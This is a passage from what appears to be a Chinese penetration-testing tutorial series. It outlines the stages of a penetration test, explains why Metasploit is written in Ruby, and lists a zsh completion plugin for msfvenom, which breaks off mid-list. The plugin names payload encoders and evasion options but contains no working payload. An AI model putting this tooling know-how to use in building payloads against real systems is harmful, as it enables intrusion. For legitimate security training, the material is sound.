Analysis）阶段。</p><p>在该阶段，渗透测试者需要综合分析前几个阶段获取并汇总的情报信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可以实施渗透攻击的攻击点，并在实验环境中进行验证。在该阶段，高水平的渗透测试团队还会针对攻击通道上的一些关键系统与服务进行安全漏洞探测与挖掘，期望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径。</p><p>5：渗透攻击阶段<br>渗透攻击（Exploitation）是渗透测试过程中最具有魅力的环节。在此环节中，渗透测试团队需要利用他们所找出的目标系统安全漏洞，来真正入侵系统当中，获得访问控制权。</p><p>渗透攻击可以利用公开渠道可获取的渗透代码，但一般在实际应用场景中，渗透测试者还需要充分地考虑目标系统特性来定制渗透攻击，并需要挫败目标网络与系统中实施的安全防御措施，才能成功达成渗透目的。在黑盒测试中，渗透测试者还需要考虑对目标系统检测机制的逃逸，从而避免造成目标组织安全响应团队的警觉和发现</p><p>6：后渗透攻击阶段<br>后渗透攻击（Post Exploitation）是整个渗透测试过程中最能够体现渗透测试团队创造力与技术能力的环节。前面的环节可以说都是在按部就班地完成非常普遍的目标，而在这个环节中，需要渗透测试团队根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径。</p><p>在不同的渗透测试场景中，这些攻击目标与途径可能是千变万化的，而设置是否准确并且可行，也取决于团队自身的创新意识、知识范畴、实际经验和技术能力。</p><p>7：报告阶段<br>渗透测试过程最终向客户组织提交，取得认可并成功获得合同付款的就是一份渗透测试报告（Reporting）。这份报告凝聚了之前所有阶段之中渗透测试团队所获取的关键情报信息、探测和发掘出的系统安全漏洞、成功渗透攻击的过程，以及造成业务影响后果的攻击途径，同时还要站在防御者的角度上，帮助他们分析安全防御体系中的薄弱环节、存在的问题，以及修补与升级技术方案。</p><p>本系列教程以msf 4.15.45为基础，后期可能会以msf5为基础。<br><img src="../do/media/37bb6bcff95bfb01c8a447d8d4bc717b.jpg" alt></p><p>msf核心代码为Ruby开发。这里需要解释，为什么作者以Ruby为核心语言开发？而不是python，perl等大众语言开发？</p><h3 id="这里转载原作者的话："><a href="#这里转载原作者的话：" class="headerlink" title="这里转载原作者的话："></a>这里转载原作者的话：</h3><p>以下是在2005年左右写的。<br>在框架的开发过程中，Metasploit开发人员不断被问到的一个反复出现的问题是为什么选择Ruby作为编程语言。为避免单独回答此问题，作者选择在本文档中解释其原因。</p><p>由于很多原因，选择了Ruby编程语言而不是其他选择，例如python，perl和C++。选择Ruby的第一个（也是主要的）原因是因为它是Metasploit员工喜欢写的一种语言。在花时间分析其他语言并考虑过去的经验后，发现Ruby编程语言既简单又强大解释语言的方法。Ruby提供的内省程度和面向对象的方面非常适合框架的一些要求。框架对代码重用的自动化类构造的需求是决策制定过程中的关键因素，而且它是perl不太适合提供的东西之一。除此之外，选择Ruby的第二个原因是因为它支持平台独立于线程。虽然在该模型下开发框架期间遇到了许多限制，但Metasploit工作人员观察到了2.x分支的显着性能和可用性改进。未来版本的Ruby（1.9系列）将使用本机线程支持现有的线程API，操作系统将编译解释器，这将解决当前实现的许多现有问题（例如允许使用阻塞操作）。与此同时，与传统的分叉模型相比，现有的线程模型被发现要优越得多，特别是在缺少像Windows这样的原生分支实现的平台上。</p><p>选择Ruby的另一个原因是因为Windows平台支持存在本机解释器。虽然perl有cygwin版本和ActiveState版本，但两者都受到可用性问题的困扰。可以在Windows上本地编译和执行Ruby解释器的事实大大提高了性能。此外，解释器也非常小，并且可以在出现错误时轻松修改。</p><p>Python编程语言也是候选语言。Metasploit员工选择Ruby而不是python的原因有几个原因。主要原因是对python强制的一些语法烦恼的普遍厌恶，例如block-indention。虽然许多人认为这种方法的好处，但Metasploit工作人员的一些成员认为这是一个不必要的限制。Python的其他问题围绕父类方法调用的限制和解释器的向后兼容性。</p><p> C / C++编程语言也得到了非常认真的考虑，但最终很明显，尝试以非解释性语言部署可移植和可用的框架是不可行的。</p><p>此外，这种语言选择的开发时间线很可能会更长。尽管框架的2.x分支已经相当成功，但Metasploit开发人员遇到了许多限制和烦恼与perl的面向对象编程模型或缺乏。事实上perl解释器是许多发行版上默认安装的一部分，这并不是Metasploit员工认为值得绕开语言选择的东西。</p><p>最后，所有这些都归结为选择一种对框架贡献最大的人所享有的语言，而这种语言最终成为Ruby。</p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>30、解决msfvenom命令自动补全</title>
      <link href="/article/30_%E8%A7%A3%E5%86%B3msfvenom%E5%91%BD%E4%BB%A4%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8.html"/>
      <url>/article/30_%E8%A7%A3%E5%86%B3msfvenom%E5%91%BD%E4%BB%A4%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8.html</url>
      
        <content type="html"><![CDATA[<p>本课是针对前第1-20课时的msfvenom生成payload的自动补全命令补充。虽msfvenom强大，同样有着非常繁琐的参数，参数强大，意味着会增加工作效率，但它并不像MSF有命令补全功能，故本课吸取前20课经验，自动补全msfvenom的参数。</p><h3 id="需要zsh的支持："><a href="#需要zsh的支持：" class="headerlink" title="需要zsh的支持："></a>需要zsh的支持：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# cat /etc/shells</span><br><span class="line"># /etc/shells: valid login shells</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/dash</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/bin/zsh</span><br><span class="line">/usr/bin/zsh</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">root@John:~# echo $SHELL</span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><p><img src="../do/media/a253496a83244db9db0c40cfd1e5a998.jpg" alt></p><p><strong>复制附录A到~/.oh-my-zsh/custom/plugins/msfvenom文件夹下（注：没有msfvenom目录，创建即可）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/.oh‐my‐zsh/custom/plugins/msfvenom# pwd</span><br><span class="line">/root/.oh‐my‐zsh/custom/plugins/msfvenom</span><br><span class="line">root@John:~/.oh‐my‐zsh/custom/plugins/msfvenom# ls</span><br><span class="line">_msfvenom</span><br></pre></td></tr></table></figure><p><img src="../do/media/294978a0111c92b96cf2c9ce421cbd78.jpg" alt></p><p>编辑~/.zshrc文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# nano ~/.zshrc</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# nano ~/.zshrc</span><br><span class="line">root@John:~# cat ~/.zshrc</span><br><span class="line">plugins=(msfvenom)</span><br></pre></td></tr></table></figure><p><img src="../do/media/b2882baf73972c21b6e11b5132e52a94.jpg" alt></p><p><strong>更新：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@John:~# source ~/.zshrc</span><br></pre></td></tr></table></figure><p><strong>效果如下：</strong>  </p><p><img src="../do/media/c693938819ad8820ee60c300a080e91a.jpg" alt>  </p><p><img src="../do/media/2625fc702fe3e4dbc6c6faab8fe3bd66.jpg" alt></p><h3 id="附录A："><a href="#附录A：" class="headerlink" title="附录A："></a>附录A：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br></pre></td><td class="code"><pre><span class="line">#compdef msfvenom</span><br><span class="line">#autoload</span><br><span class="line">#</span><br><span class="line"># zsh completion for msfvenom in Metasploit Framework Project (https://www.metasploit.com)</span><br><span class="line">#</span><br><span class="line"># github: https://github.com/Green‐m/msfvenom‐zsh‐completion</span><br><span class="line">#</span><br><span class="line"># author: Green‐m (greenm.xxoo@gmail.com)</span><br><span class="line">#</span><br><span class="line"># license: GNU General Public License v3.0</span><br><span class="line">#</span><br><span class="line"># Copyright (c) 2018, Green‐m</span><br><span class="line"># All rights reserved.</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line">VENOM_CACHE_FILE=~/.zsh/venom‐cache </span><br><span class="line"></span><br><span class="line">venom‐clear‐cache() &#123;</span><br><span class="line">rm $VENOM_CACHE_FILE</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">venom‐cache‐payloads() &#123; </span><br><span class="line"></span><br><span class="line">if [ ‐x &quot;$(command ‐v msfvenom)&quot; ]</span><br><span class="line">then</span><br><span class="line">VENOM=&quot;msfvenom&quot;</span><br><span class="line">elif [ ‐n &quot;$_comp_command1&quot; ]</span><br><span class="line">then</span><br><span class="line">VENOM=$_comp_command1</span><br><span class="line">else</span><br><span class="line">echo &quot;Cound not find msfvenom path in system env, please run msfvenom with path.&quot;</span><br><span class="line">fi </span><br><span class="line"></span><br><span class="line">if [[ ! ‐d $&#123;VENOM_CACHE_FILE:h&#125; ]]; then</span><br><span class="line">mkdir ‐p $&#123;VENOM_CACHE_FILE:h&#125;</span><br><span class="line">fi </span><br><span class="line"></span><br><span class="line">if [[ ! ‐f $VENOM_CACHE_FILE ]]; then</span><br><span class="line">echo ‐n &quot;(...caching Metasploit Payloads...)&quot;</span><br><span class="line">$VENOM ‐‐list payload|grep ‐e &quot;^.*\/&quot; | awk &apos;&#123;print $1&#125;&apos; &gt;&gt;</span><br><span class="line">$VENOM_CA CHE_FILE</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">_msfvenom() &#123; </span><br><span class="line"></span><br><span class="line">local curcontext=&quot;$curcontext&quot; state line</span><br><span class="line">typeset ‐A opt_args </span><br><span class="line"></span><br><span class="line">_arguments ‐C \</span><br><span class="line">&apos;(‐h ‐‐help)&apos;&#123;‐h,‐‐help&#125;&apos;[show help]&apos; \</span><br><span class="line">&apos;(‐l ‐‐list)&apos;&#123;‐l,‐‐list&#125;&apos;[List all modules for type. Types are: paylo</span><br><span class="line">ads, encoders, nops, platforms, archs, encrypt, formats, all]&apos; \</span><br><span class="line">&apos;(‐p ‐‐payload)&apos;&#123;‐p,‐‐payload&#125;&apos;[Payload to use (‐‐list payloads to list,</span><br><span class="line">‐‐list‐options for arguments). Specify ‐ or STDIN for custom]&apos; \</span><br><span class="line">&apos;(‐‐list‐options)‐‐list‐options[List ‐‐payload &lt;value&gt; standard, adva</span><br><span class="line">nced and evasion options]&apos; \</span><br><span class="line">&apos;(‐f ‐‐format)&apos;&#123;‐f,‐‐format&#125;&apos;[Output format (use ‐‐list formats to li</span><br><span class="line">st)]&apos; \</span><br><span class="line">&apos;(‐e ‐‐encoder)&apos;&#123;‐e,‐‐encoder&#125;&apos;[The encoder to use (use ‐‐list encoders</span><br><span class="line">to list)]&apos; \</span><br><span class="line">&apos;(‐‐smallest)‐‐smallest[Generate the smallest possible payload using all</span><br><span class="line">available encoders]&apos; \</span><br><span class="line">&apos;(‐‐encrypt)‐‐encrypt[The type of encryption or encoding to apply to the</span><br><span class="line">shellcode (use ‐‐list encrypt to list)]&apos; \</span><br><span class="line">&apos;(‐‐encrypt‐key)‐‐encrypt‐key[A key to be used for ‐‐encrypt]&apos; \</span><br><span class="line">&apos;(‐‐encrypt‐iv)‐‐encrypt‐iv[An initialization vector for ‐‐encrypt]&apos; \</span><br><span class="line">&apos;(‐a ‐‐arch)&apos;&#123;‐a,‐‐arch&#125;&apos;[the architecture to use for ‐‐payload and ‐</span><br><span class="line">‐encoders (use ‐‐list archs to list)]&apos; \</span><br><span class="line">&apos;(‐‐platform)‐‐platform[The platform for ‐‐payload (use ‐‐list platfo rms</span><br><span class="line">to list)]&apos; \</span><br><span class="line">&apos;(‐o ‐‐out)&apos;&#123;‐o,‐‐out&#125;&apos;[Save the payload to a file]&apos; \</span><br><span class="line">&apos;(‐b ‐‐bad‐chars)&apos;&#123;‐b,‐‐bad‐chars&#125;&apos;[Characters to avoid example: &quot;\x0</span><br><span class="line">0\xff&quot;]&apos; \</span><br><span class="line">&apos;(‐n ‐‐nopsled)&apos;&#123;‐n,‐‐nopsled&#125;&apos;[Prepend a nopsled of \[length\] size on</span><br><span class="line">to the payload]&apos; \</span><br><span class="line">&apos;(‐‐encoder‐space)‐‐encoder‐space[The maximum size of the encoded pay</span><br><span class="line">load (defaults to the ‐s value)]&apos; \</span><br><span class="line">&apos;(‐i ‐‐iterations)&apos;&#123;‐i,‐‐iterations&#125;&apos;[The number of times to encode t he</span><br><span class="line">payload]&apos; \</span><br><span class="line">&apos;(‐c ‐‐add‐code)&apos;&#123;‐c,‐‐add‐code&#125;&apos;[Specify an additional win32 shellcode</span><br><span class="line">file to include]&apos; \</span><br><span class="line">&apos;(‐x ‐‐template)&apos;&#123;‐x,‐‐template&#125;&apos;[Specify a custom executable file to use</span><br><span class="line">as a template]&apos; \</span><br><span class="line">&apos;(‐k ‐‐keep)&apos;&#123;‐k,‐‐keep&#125;&apos;[Preserve the ‐‐template behaviour and inject</span><br><span class="line">the payload as a new thread]&apos; \</span><br><span class="line">&apos;(‐v ‐‐var‐name)&apos;&#123;‐v,‐‐var‐name&#125;&apos;[Specify a custom variable name to use</span><br><span class="line">for certain output formats]&apos; \</span><br><span class="line">&apos;(‐t ‐‐timeout)&apos;&#123;‐t,‐‐timeout&#125;&apos;[The number of seconds to wait when re</span><br><span class="line">ading the payload from STDIN (default 30, 0 to disable)]&apos; \</span><br><span class="line">&apos;*: :($(__msfvenom_options))&apos; &amp;&amp; ret=0 </span><br><span class="line"></span><br><span class="line">lastword=$&#123;words[$&#123;#words[@]&#125;‐1]&#125; </span><br><span class="line"></span><br><span class="line">case &quot;$lastword&quot; in</span><br><span class="line">(‐p|‐‐payload)</span><br><span class="line">_values &apos;payload&apos; $(__msfvenom_payloads)</span><br><span class="line">;; </span><br><span class="line"></span><br><span class="line">(‐l|‐‐list)</span><br><span class="line">local lists=(&apos;payloads&apos; &apos;encoders&apos; &apos;nops&apos; &apos;platforms&apos; &apos;archs&apos; &apos;encrypt&apos;</span><br><span class="line">&apos;formats&apos; &apos;all&apos;)</span><br><span class="line"></span><br><span class="line">_values &apos;list&apos; $lists</span><br><span class="line">;; </span><br><span class="line"></span><br><span class="line">(‐encrypt)</span><br><span class="line">local encrypts=(&apos;aes256&apos; &apos;base64&apos; &apos;rc4&apos; &apos;xor&apos;)</span><br><span class="line">_values &apos;encrypt&apos; $encrypts</span><br><span class="line">;; </span><br><span class="line"></span><br><span class="line">(‐a|‐‐arch)</span><br><span class="line">_values &apos;arch&apos; $(__msfvenom_archs)</span><br><span class="line">;; </span><br><span class="line"></span><br><span class="line">(‐platform)</span><br><span class="line">_values &apos;platform&apos; $(__msfvenom_platforms)</span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line">(‐f|‐‐format)</span><br><span class="line">_values &apos;format&apos; $(__msfvenom_formats)</span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line">(‐e|‐‐encoder)</span><br><span class="line">_values &apos;encoder&apos; $(__msfvenom_encoders)</span><br><span class="line">;; </span><br><span class="line"></span><br><span class="line">(‐o|‐‐out|‐x|‐‐template|‐c|‐‐add‐code)</span><br><span class="line">_files</span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line">(*)</span><br><span class="line"></span><br><span class="line">;; </span><br><span class="line"></span><br><span class="line">esac</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">__msfvenom_payloads()&#123;</span><br><span class="line">local msf_payloads </span><br><span class="line"></span><br><span class="line"># we cache the list of packages (originally from the macports plugin)</span><br><span class="line">venom‐cache‐payloads</span><br><span class="line">msf_payloads=`cat $VENOM_CACHE_FILE` </span><br><span class="line"></span><br><span class="line">for line in $msf_payloads; do</span><br><span class="line">echo &quot;$line&quot;</span><br><span class="line">done</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">__msfvenom_archs()&#123;</span><br><span class="line">local archs</span><br><span class="line">archs=(</span><br><span class="line">&apos;aarch64&apos;</span><br><span class="line">&apos;armbe&apos;</span><br><span class="line">&apos;armle&apos;</span><br><span class="line">&apos;cbea&apos;</span><br><span class="line">&apos;cbea64&apos;</span><br><span class="line">&apos;cmd&apos;</span><br><span class="line">&apos;dalvik&apos;</span><br><span class="line">&apos;firefox&apos;</span><br><span class="line">&apos;java&apos;</span><br><span class="line">&apos;mips&apos;</span><br><span class="line">&apos;mips64&apos;</span><br><span class="line">&apos;mips64le&apos;</span><br><span class="line">&apos;mipsbe&apos;</span><br><span class="line">&apos;mipsle&apos;</span><br><span class="line">&apos;nodejs&apos;</span><br><span class="line">&apos;php&apos;</span><br><span class="line">&apos;ppc&apos;</span><br><span class="line">&apos;ppc64&apos;</span><br><span class="line">&apos;ppc64le&apos;</span><br><span class="line">&apos;ppce500v2&apos;</span><br><span class="line">&apos;python&apos;</span><br><span class="line">&apos;r&apos;</span><br><span class="line">&apos;ruby&apos;</span><br><span class="line">&apos;sparc&apos;</span><br><span class="line">&apos;sparc64&apos;</span><br><span class="line">&apos;tty&apos;</span><br><span class="line">&apos;x64&apos;</span><br><span class="line">&apos;x86&apos;</span><br><span class="line">&apos;x86_64&apos;</span><br><span class="line">&apos;zarch&apos;</span><br><span class="line">) </span><br><span class="line"></span><br><span class="line">for line in $archs; do</span><br><span class="line">echo &quot;$line&quot;</span><br><span class="line">done </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">__msfvenom_encoders()&#123;</span><br><span class="line">local encoders</span><br><span class="line">encoders=(</span><br><span class="line">&apos;cmd/brace&apos;</span><br><span class="line">&apos;cmd/echo&apos;</span><br><span class="line">&apos;cmd/generic_sh&apos;</span><br><span class="line">&apos;cmd/ifs&apos;</span><br><span class="line">&apos;cmd/perl&apos;</span><br><span class="line">&apos;cmd/powershell_base64&apos;</span><br><span class="line">&apos;cmd/printf_php_mq&apos;</span><br><span class="line">&apos;generic/eicar&apos;</span><br><span class="line">&apos;generic/none&apos;</span><br><span class="line">&apos;mipsbe/byte_xori&apos;</span><br><span class="line">&apos;mipsbe/longxor&apos;</span><br><span class="line">&apos;mipsle/byte_xori&apos;</span><br><span class="line">&apos;mipsle/longxor&apos;</span><br><span class="line">&apos;php/base64&apos;</span><br><span class="line">&apos;ppc/longxor&apos;</span><br><span class="line">&apos;ppc/longxor_tag&apos;</span><br><span class="line">&apos;ruby/base64&apos;</span><br><span class="line">&apos;sparc/longxor_tag&apos;</span><br><span class="line">&apos;x64/xor&apos;</span><br><span class="line">&apos;x64/xor_dynamic&apos;</span><br><span class="line">&apos;x64/zutto_dekiru&apos;</span><br><span class="line">&apos;x86/add_sub&apos;</span><br><span class="line">&apos;x86/alpha_mixed&apos;</span><br><span class="line">&apos;x86/alpha_upper&apos;</span><br><span class="line">&apos;x86/avoid_underscore_tolower&apos;</span><br><span class="line">&apos;x86/avoid_utf8_tolower&apos;</span><br><span class="line">&apos;x86/bloxor&apos;</span><br><span class="line">&apos;x86/bmp_polyglot&apos;</span><br><span class="line">&apos;x86/call4_dword_xor&apos;</span><br><span class="line">&apos;x86/context_cpuid&apos;</span><br><span class="line">&apos;x86/context_stat&apos;</span><br><span class="line">&apos;x86/context_time&apos;</span><br><span class="line">&apos;x86/countdown&apos;</span><br><span class="line">&apos;x86/fnstenv_mov&apos;</span><br><span class="line">&apos;x86/jmp_call_additive&apos;</span><br><span class="line">&apos;x86/nonalpha&apos;</span><br><span class="line">&apos;x86/nonupper&apos;</span><br><span class="line">&apos;x86/opt_sub&apos;</span><br><span class="line">&apos;x86/service&apos;</span><br><span class="line">&apos;x86/shikata_ga_nai&apos;</span><br><span class="line">&apos;x86/single_static_bit&apos;</span><br><span class="line">&apos;x86/unicode_mixed&apos;</span><br><span class="line">&apos;x86/unicode_upper&apos;</span><br><span class="line">&apos;x86/xor_dynamic&apos;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">for line in $encoders; do</span><br><span class="line">echo &quot;$line&quot;</span><br><span class="line">done</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">__msfvenom_platforms()&#123;</span><br><span class="line">local platforms</span><br><span class="line">platforms=(</span><br><span class="line">&apos;aix&apos;</span><br><span class="line">&apos;android&apos;</span><br><span class="line">&apos;apple_ios&apos;</span><br><span class="line">&apos;bsd&apos;</span><br><span class="line">&apos;bsdi&apos;</span><br><span class="line">&apos;cisco&apos;</span><br><span class="line">&apos;firefox&apos;</span><br><span class="line">&apos;freebsd&apos;</span><br><span class="line">&apos;hardware&apos;</span><br><span 